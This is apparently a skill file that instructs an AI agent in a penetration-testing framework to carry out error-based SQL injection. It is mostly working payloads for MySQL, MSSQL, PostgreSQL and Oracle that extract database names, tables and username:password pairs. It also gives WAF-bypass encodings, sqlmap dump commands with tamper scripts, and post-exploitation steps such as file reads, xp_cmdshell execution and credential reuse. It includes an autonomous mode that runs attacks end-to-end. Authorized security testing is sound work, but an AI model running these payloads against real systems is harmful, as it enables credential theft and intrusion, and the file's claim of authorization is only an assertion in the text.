---
name: sql-injection-error
description: >
  Guide error-based SQL injection exploitation during authorized penetration
  testing.
keywords:
  - error-based SQLi
  - EXTRACTVALUE
  - UPDATEXML
  - CONVERT INT
  - CAST AS INT
  - database errors in response
  - verbose SQL errors
tools:
  - sqlmap
  - burpsuite
opsec: medium
---

# Error-Based SQL Injection

You are helping a penetration tester exploit error-based SQL injection. The
target application returns database error messages that can be leveraged to
extract data. All testing is under explicit written authorization.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Before executing any command that sends traffic to a
  target, present the command with a one-line explanation of what it does and
  why. Wait for explicit user approval before executing. Never batch multiple
  target-touching commands without approval — present them one at a time (or as
  a small logical group if they achieve a single objective, e.g., "enumerate SMB
  shares"). Local-only operations (file writes, output parsing, engagement
  logging, hash cracking) do not require approval. At decision forks, present
  options and let the user choose.
- **Autonomous**: Execute end-to-end. Auto-detect DBMS from errors, select
  appropriate extraction functions, paginate through data. Report extracted data
  at milestones. Only pause before destructive actions.

If unclear, default to guided.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[sql-injection-error] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

Do NOT write to `engagement/activity.md`, `engagement/findings.md`, or
engagement state. The orchestrator maintains these files. Report all findings
in your return summary.

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

**Do NOT write engagement state.** When your work is complete, report all
findings clearly in your return summary. The orchestrator parses your summary
and records state changes. Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- Confirmed SQL injection point (see **web-discovery**)
- Application displays verbose database error messages in the response
- If errors are generic or hidden, use **sql-injection-blind** instead

## Step 1: Assess

If not already provided by the orchestrator or conversation context, determine:
1. **Injection point** — URL, parameter name, request method
2. **Error observed** — paste the exact error message
3. **DBMS** — if known from error signatures or prior testing

Skip if context was already provided.

## Step 2: Identify DBMS

If the DBMS is unknown, fingerprint from the error message:

| Error Signature | DBMS |
|---|---|
| `You have an error in your SQL syntax` | MySQL |
| `Unclosed quotation mark` / `CONVERT` | MSSQL |
| `ERROR: invalid input syntax for` | PostgreSQL |
| `ORA-` prefix | Oracle |

If unclear, inject identification payloads:
```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--+          -- MySQL
' AND 1=CONVERT(INT,@@version)--+                        -- MSSQL
' AND 1=CAST(version() AS INT)--+                        -- PostgreSQL
' AND 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE ROWNUM=1))--+ -- Oracle
```

## Step 3: Extract Data

Walk through extraction in this order:
1. **Current user and database** — confirms extraction works
2. **List databases/schemas**
3. **List tables** in the target database
4. **List columns** in the target table
5. **Extract data** — credentials, secrets, flags

### MySQL

**EXTRACTVALUE** (MySQL 5.1+) — most reliable:
```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))--+
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--+
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)))--+
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='TARGET_DB')))--+
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='TARGET_TABLE')))--+
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(username,0x3a,password) FROM TARGET_TABLE)))--+
```

> **32-char truncation**: EXTRACTVALUE/UPDATEXML truncate to ~32 chars. Paginate:
> ```sql
> ' AND EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),1,31)))--+
> ' AND EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT ...),32,31)))--+
> ```

**Alternatives** when EXTRACTVALUE is blocked:
```sql
-- UPDATEXML
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--+

-- GTID_SUBSET (MySQL 5.6+)
' AND GTID_SUBSET(CONCAT(0x7e,(SELECT user())),1)--+

-- JSON_KEYS (MySQL 5.7+)
' AND JSON_KEYS(CONCAT(0x7e,(SELECT user())))--+

-- FLOOR(RAND()) — classic double-query error
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--+

-- EXP (MySQL 5.5+) — overflow error
' AND EXP(~(SELECT * FROM (SELECT user())a))--+
```

### MSSQL

**CONVERT/CAST** — force type conversion error:
```sql
' AND 1=CONVERT(INT,SYSTEM_USER)--+
' AND 1=CONVERT(INT,DB_NAME())--+
' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM master..sysdatabases))--+
' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM master..sysdatabases WHERE name NOT IN ('master','tempdb','model','msdb')))--+
' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--+
' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM syscolumns WHERE id=OBJECT_ID('TARGET_TABLE')))--+
' AND 1=CONVERT(INT,(SELECT TOP 1 username+':'+password FROM TARGET_TABLE))--+
```

**WAF bypass alternatives**:
```sql
' AND 1=SUSER_NAME((SELECT TOP 1 name FROM master..sysdatabases))--+
' AND 1=USER_NAME((SELECT TOP 1 name FROM master..sysdatabases))--+
' AND 1=0/@@version--+
```

### PostgreSQL

**CAST** — force type conversion:
```sql
' AND 1=CAST(current_user AS INT)--+
' AND 1=CAST(current_database() AS INT)--+
' AND 1=CAST((SELECT string_agg(datname,',') FROM pg_database) AS INT)--+
' AND 1=CAST((SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public') AS INT)--+
' AND 1=CAST((SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='TARGET_TABLE') AS INT)--+
' AND 1=CAST((SELECT string_agg(username||':'||password,',') FROM TARGET_TABLE) AS INT)--+
```

**XML helper** for large datasets:
```sql
' AND 1=CAST(query_to_xml('SELECT * FROM TARGET_TABLE',true,false,'') AS INT)--+
```

### Oracle

**utl_inaddr.get_host_name**:
```sql
' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))--+
' AND 1=utl_inaddr.get_host_name((SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables WHERE ROWNUM<=10))--+
```

**Alternatives**:
```sql
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--+
' AND 1=(SELECT UPPER(dbms_xmlgen.getxml('SELECT user FROM dual')) FROM dual)--+
' AND 1=(SELECT XMLType('<:'||(SELECT user FROM dual)||'>') FROM dual)--+
' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH((SELECT user FROM dual))--+
```

## Step 4: Post-Exploitation

After extracting target data:
1. **File read** — MySQL `LOAD_FILE()`, MSSQL `OPENROWSET BULK`, PostgreSQL `pg_read_file()`
2. **Command execution** — route to **sql-injection-stacked** for xp_cmdshell, COPY TO PROGRAM
3. **Credential reuse** — test extracted creds against SSH, RDP, admin panels

## Step 5: Escalate or Pivot

- **Need command execution**: Route to **sql-injection-stacked**
- **UNION becomes viable**: Route to **sql-injection-union**
- **Errors stop appearing**: Route to **sql-injection-blind**
- **Extracted credentials**: Test against other services, document findings

Update `engagement/state.md` with any new credentials, access, vulns, or pivot paths discovered.

When routing, pass along: injection point, DBMS, current mode, and payloads that worked.

## Stall Detection

If you have spent **5 or more tool-calling rounds** on the same failure with
no meaningful progress — same error, no new information, no change in output
— **stop**.

**What counts as progress:**
- Trying a variant or alternative **documented in this skill**
- Adjusting syntax, flags, or parameters per the Troubleshooting section
- Gaining new diagnostic information (different error, partial success)

**What does NOT count as progress:**
- Writing custom exploit code not provided in this skill
- Inventing workarounds using techniques from other domains
- Retrying the same command with trivially different input
- Compiling or transferring tools not mentioned in this skill

If you find yourself writing code that isn't in this skill, you have left
methodology. That is a stall.

Do not loop. Work through failures systematically:
1. Try each variant or alternative **once**
2. Check the Troubleshooting section for known fixes
3. If nothing works after 5 rounds, you are stalled

**When stalled, return to the orchestrator immediately with:**
- What was attempted (commands, variants, alternatives tried)
- What failed and why (error messages, empty responses, timeouts)
- Assessment: **blocked** (permanent — config, patched, missing prereq) or
  **retry-later** (may work with different context, creds, or access)

**Mode behavior:**
- **Guided**: Tell the user you're stalled, present what was tried, and
  recommend the next best path.
- **Autonomous**: Return findings to the orchestrator. Do not retry the same
  technique — the orchestrator will decide whether to revisit with new context
  or route elsewhere.

## OPSEC Notes

- Error-based injection is read-only — no database artifacts to clean up
- Payloads appear in application logs, DB slow query logs, and WAF logs
- Defenders look for: `EXTRACTVALUE`, `UPDATEXML`, `GTID_SUBSET`, `CONVERT(INT,`, `CAST(... AS INT)` patterns

## Troubleshooting

### Error Messages Not Displayed
The application may catch errors and return a generic page:
- Try **sql-injection-blind** (boolean or time-based) instead
- Check if errors appear in HTTP headers (X-Debug, X-Error)
- Check if error details appear in a different response format (JSON error field, XML fault)

### Output Truncated
EXTRACTVALUE/UPDATEXML limit output to ~32 chars. Paginate with SUBSTRING:
```sql
SUBSTRING((SELECT ...),1,31)    -- chars 1-31
SUBSTRING((SELECT ...),32,31)   -- chars 32-62
```

### WAF Blocking Keywords
```sql
-- Replace EXTRACTVALUE with UPDATEXML or GTID_SUBSET
-- Use MySQL conditional comments
' AND /*!50000EXTRACTVALUE*/(1,CONCAT(0x7e,version()))--+

-- Hex-encode string literals
-- 'information_schema' -> 0x696e666f726d6174696f6e5f736368656d61

-- Double URL-encode
%2527%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,version()))--+
```

### Automated Extraction with sqlmap
```bash
# Error-based technique only
sqlmap -u "https://TARGET/page?id=1" --batch --technique=E --dbs

# From Burp request file
sqlmap -r request.txt --batch --technique=E --dbs

# Dump specific table
sqlmap -r request.txt --batch --technique=E -D TARGET_DB -T TARGET_TABLE --dump

# With tamper scripts
sqlmap -r request.txt --batch --technique=E --tamper=between,randomcase --dbs
```
